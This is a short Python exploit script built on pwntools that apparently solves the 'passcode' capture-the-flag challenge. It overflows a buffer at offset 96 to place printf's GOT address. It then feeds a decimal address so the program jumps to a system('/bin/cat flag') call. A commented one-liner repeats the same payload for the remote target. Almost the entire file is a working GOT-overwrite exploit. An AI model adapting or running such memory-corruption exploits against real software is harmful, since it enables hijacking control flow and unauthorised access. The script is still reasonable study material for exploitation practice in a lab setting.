from pwn import *

exe = './passcode'
elf = ELF(exe, checksec=True)
context.log_level = 'info'
io = process(exe)

# first scanf offset cyclic('yaaa') : 96 
# 2nd scanf offset                  : 80 - 4 (?)

offset = 96
payload = flat({
    offset: [
        elf.got['printf'] # 0x804a000
    ]
})

io.send(payload)
io.sendlineafter(b':', b'134514147') # 0x80485e3: system("/bin/cat flag") on login
io.interactive()

# remote :
# python -c "print 'a'*96 + '\x00\xa0\x04\x08' + '134514147'" | ./passcode